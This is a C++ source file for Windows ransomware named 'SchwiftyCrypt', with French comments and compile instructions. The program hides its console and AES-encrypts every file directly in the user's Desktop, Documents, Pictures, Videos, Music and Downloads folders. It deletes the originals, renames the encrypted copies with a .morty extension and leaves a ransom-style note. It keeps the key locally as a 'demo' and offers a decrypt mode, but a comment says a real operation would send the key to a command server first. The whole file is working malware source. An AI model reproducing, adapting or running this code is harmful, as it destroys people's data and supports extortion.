// language: C++17, file: src/tools/03_ransomware.cpp, target: Windows 10/11, MSVC/MinGW
// SchwiftyCrypt - AES-256-CBC via CNG (BCrypt). Fichiers renommes .morty.
// Modes:  (sans arg) = chiffrer   |   decrypt = dechiffrer avec la cle sauvegardee
// MinGW: g++ -O2 -std=c++17 03_ransomware.cpp -o ransom.exe -lbcrypt
// TEST EN VM UNIQUEMENT - il chiffre vraiment les fichiers utilisateur.
#include <windows.h>
#include <bcrypt.h>
#include <cstdio>
#include <string>
#include <vector>

#pragma comment(lib, "bcrypt.lib")

#define NT_OK(s) (((NTSTATUS)(s)) >= 0)
static const DWORD kMaxFile = 128 * 1024 * 1024; // 128 Mo max par fichier

static std::string UserProfile() {
    char p[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", p, MAX_PATH);
    return p;
}

int main(int argc, char** argv) {
    FreeConsole();
    bool decrypt = (argc > 1 && strcmp(argv[1], "decrypt") == 0);
    std::string up = UserProfile();

    BCRYPT_ALG_HANDLE alg = NULL;
    if (!NT_OK(BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0))) return 1;
    if (!NT_OK(BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) return 1;

    // cle + IV : 48 octets. En demo ils restent locaux (dechiffrable);
    // en operation reelle ils partiraient vers le C2 avant le chiffrement.
    std::string keyPath = up + "\\rick_key.bin";
    BYTE blob[48];
    if (decrypt) {
        FILE* f = fopen(keyPath.c_str(), "rb");
        if (!f) return 2;
        fread(blob, 1, 48, f); fclose(f);
    } else {
        BCryptGenRandom(NULL, blob, 48, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        FILE* f = fopen(keyPath.c_str(), "wb");
        if (f) { fwrite(blob, 1, 48, f); fclose(f); }
    }

    BCRYPT_KEY_HANDLE hk = NULL;
    if (!NT_OK(BCryptGenerateSymmetricKey(alg, &hk, NULL, 0, blob, 32, 0))) return 3;
    BYTE iv[16]; memcpy(iv, blob + 32, 16);

    // repertoires utilisateur a traiter
    std::vector<std::string> roots = {
        up + "\\Desktop", up + "\\Documents", up + "\\Pictures",
        up + "\\Videos",  up + "\\Music",    up + "\\Downloads"
    };

    for (const std::string& root : roots) {
        char mask[MAX_PATH]; snprintf(mask, sizeof(mask), "%s\\*.*", root.c_str());
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA(mask, &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            std::string full = root + "\\" + fd.cFileName;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            std::string name = fd.cFileName;
            bool isMorty = name.size() > 6 && name.substr(name.size() - 6) == ".morty";
            if (decrypt && !isMorty) continue;
            if (!decrypt && isMorty) continue;
            if (!decrypt && (name.size() > 4 &&
                (name.substr(name.size() - 4) == ".exe" || name.substr(name.size() - 4) == ".dll"))) continue;

            FILE* f = fopen(full.c_str(), "rb");
            if (!f) continue;
            fseek(f, 0, SEEK_END);
            long sz = ftell(f); fseek(f, 0, SEEK_SET);
            if (sz <= 0 || (DWORD)sz > kMaxFile) { fclose(f); continue; }
            std::vector<BYTE> data(sz);
            fread(data.data(), 1, sz, f); fclose(f);

            if (decrypt) {
                BYTE ivc[16]; memcpy(ivc, blob + 32, 16);
                ULONG done = 0;
                std::vector<BYTE> out(data.size());
                if (NT_OK(BCryptDecrypt(hk, data.data(), (ULONG)data.size(), NULL,
                                        ivc, 16, out.data(), (ULONG)out.size(), &done,
                                        BCRYPT_BLOCK_PADDING))) {
                    std::string orig = full.substr(0, full.size() - 6);
                    FILE* o = fopen(orig.c_str(), "wb");
                    if (o) { fwrite(out.data(), 1, done, o); fclose(o); }
                    DeleteFileA(full.c_str());
                }
            } else {
                BYTE ivc[16]; memcpy(ivc, blob + 32, 16);
                ULONG done = 0;
                std::vector<BYTE> out(data.size() + 16);
                if (NT_OK(BCryptEncrypt(hk, data.data(), (ULONG)data.size(), NULL,
                                        ivc, 16, out.data(), (ULONG)out.size(), &done,
                                        BCRYPT_BLOCK_PADDING))) {
                    std::string enc = full + ".morty";
                    FILE* o = fopen(enc.c_str(), "wb");
                    if (o) { fwrite(out.data(), 1, done, o); fclose(o); }
                    DeleteFileA(full.c_str());
                }
            }
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }

    if (!decrypt) {
        std::string note = up + "\\Desktop\\README_RICK.txt";
        FILE* f = fopen(note.c_str(), "w");
        if (f) {
            fprintf(f,
                "GET SCHWIFTY, MORTY.\n\n"
                "Tes fichiers ont ete chiffres en AES-256-CBC.\n"
                "Extension: .morty\n"
                "Cle: le fichier rick_key.bin a cote de ce binaire (version demo).\n"
                "Lance le binaire avec 'decrypt' pour tout restaurer.\n"
                "(Wubba lubba dub dub.)\n");
            fclose(f);
        }
    }
    BCryptDestroyKey(hk);
    BCryptCloseAlgorithmProvider(alg, 0);
    return 0;
}
